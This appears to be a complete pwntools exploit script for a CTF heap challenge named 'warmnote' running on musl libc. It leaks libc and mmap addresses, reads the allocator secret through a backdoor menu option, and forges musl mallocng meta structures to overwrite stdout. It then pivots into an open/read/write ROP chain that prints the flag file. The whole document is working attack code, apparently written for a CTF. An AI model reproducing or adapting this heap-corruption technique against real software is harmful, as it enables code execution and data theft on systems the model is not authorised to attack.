from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('warmnote')
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
elf = ELF('warmnote')


def add(size, title, note):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Title: ', title)
    io.sendafter('Note: ', note)


def show(index):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('Index: ', str(index))
    io.recvuntil('Title: ')
    title = io.recvline()[:-1]
    io.recvuntil('Note: ')
    note = io.recvline()[:-1]
    return title, note


def delete(index):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('Index: ', str(index))


def edit(index, note):
    io.sendlineafter('>> ', '4')
    io.sendlineafter('Index: ', str(index))
    io.sendafter('Note: ', note)


def backdoor(addr):
    io.sendlineafter('>> ', '666')
    io.sendlineafter('[IN]: ', str(addr))
    io.recvuntil('[OUT]: ')
    return io.recvline()[:-1]


def pwn():
    add(0x30, 'a' * 0x10, 'a' * 0x30)
    add(0x30, 'b' * 0x10, 'b' * 0x30)
    add(0x30, 'c' * 0x10, 'c' * 0x30)
    delete(0)
    delete(1)
    add(0x30, 'd' * 0x10, 'd' * 0x30)
    add(0xa9c, 'e' * 0x10, 'e' * 0xa9c)
    title, _ = show(1)
    mmap_base = u64(title[0x20:0x26] + b'\x00\x00') - 0x10
    libc_base = mmap_base + 0x2000
    __malloc_context = libc_base + 0xb4ac0
    secret = u64(backdoor(__malloc_context)[:8])
    log.success('mmap_base: ' + hex(mmap_base))
    log.success('libc_base: ' + hex(libc_base))
    log.success('secret: ' + hex(secret))
    delete(0)
    delete(2)

    __stdout_FILE = libc_base + 0xb4280
    fake_meta_area_addr = mmap_base + 0x1000
    fake_meta_addr = fake_meta_area_addr + 0x10
    fake_group_addr = mmap_base + 0x1540
    prev, next, mem = __stdout_FILE - 0x18, fake_group_addr, fake_group_addr
    avail_mask, freed_mask, last_idx, freeable, sc, maplen = 2, 0, 1, 1, 10, 2
    fake_meta = p64(prev) + p64(next) + p64(mem) + p32(avail_mask) + p32(freed_mask)
    fake_meta += p64(last_idx | (freeable << 5) | (sc << 6) | (maplen << 12))
    fake_meta_area = p64(secret) + p64(0) + fake_meta
    add(0xa98, 'f' * 0x10, b'\n')                   # 0
    payload = p64(__stdout_FILE - 0x10) + p64(0) + p64(last_idx | (freeable << 5) | (sc << 6) | (maplen << 12))
    add(0xa9c, 'g' * 0x10, payload + b'\n')         # 2
    payload = b'\x00' * 0x550 + fake_meta_area
    payload = payload.ljust(0xa90, b'\x00')
    payload += p64(fake_meta_addr)
    edit(0, payload)
    delete(2)
    add(0xbc, 'h' * 0x10, '\n')
    delete(0)

    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    pop_rdi_ret = libc_base + 0x152a1
    pop_rsi_ret = libc_base + 0x1dad9
    pop_rdx_ret = libc_base + 0x2cdae
    pop_rax_ret = libc_base + 0x1b8fd
    ret = libc_base + 0x152a2
    longjmp = libc_base + 0x7b1f5
    filename = b'./flag'
    ROPchain_addr = fake_meta_area_addr + 0x100
    filename_addr = ROPchain_addr - 0x20
    flag_addr = ROPchain_addr + 0x100
    prev, next, mem = mmap_base - 0x1000 + 0x10, mmap_base - 0x1000 + 0x10, __stdout_FILE - 0x10
    avail_mask, freed_mask, last_idx, freeable, sc, maplen = 1, 0, 0, 1, 10, 2
    fake_meta = p64(prev) + p64(next) + p64(mem) + p32(avail_mask) + p32(freed_mask)
    fake_meta += p64(last_idx | (freeable << 5) | (sc << 6) | (maplen << 12))
    fake_meta_area = p64(secret) + p64(0) + fake_meta
    ROPchain  = p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
    ROPchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x40) + p64(write)
    payload = b'\x00' * 0x550 + fake_meta_area.ljust(0xe0, b'\x00')
    payload += filename.ljust(0x20, b'\x00')
    payload += ROPchain
    add(0xa9c, 'i' * 0x10, payload + b'\n')

    payload = p64(1) * 2 + p64(ROPchain_addr) + p64(ret) + b'\x00' * 8 + p64(longjmp)
    # gdb.attach(io)
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Size: ', str(0xbc))
    io.sendafter('Title: ', 'j' * 0x10)
    io.sendline(payload)
    # pause()
    flag = io.recv()
    log.success(str(flag))


if __name__ == '__main__':
    pwn()

